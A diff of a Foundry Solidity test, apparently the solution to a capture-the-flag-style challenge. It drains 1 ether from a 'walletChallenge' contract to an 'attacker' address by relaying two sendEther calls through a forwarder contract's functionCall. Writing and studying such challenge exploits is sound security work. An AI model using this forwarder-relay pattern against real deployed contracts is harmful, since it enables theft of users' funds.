@@ -25,14 +25,12 @@ contract ForwarderTest is Test, DeployForwarderScript {
 
         assertEq( address(walletChallenge).balance, 1 ether );
         assertEq( address(attacker).balance, 0 );
-
         // encodeWithSignature
         bytes memory data1 = abi.encodeWithSignature("sendEther(address,uint256)",attacker, 0.5 ether );
         forwarder.functionCall(address(walletChallenge), data1);
         // encodeWithSelector
         bytes memory data2 = abi.encodeWithSelector(Wallet.sendEther.selector,attacker, 0.5 ether );
         forwarder.functionCall(address(walletChallenge), data2);
-
 
         assertEq( address(walletChallenge).balance, 0 );
         assertEq( address(attacker).balance, 1 ether );
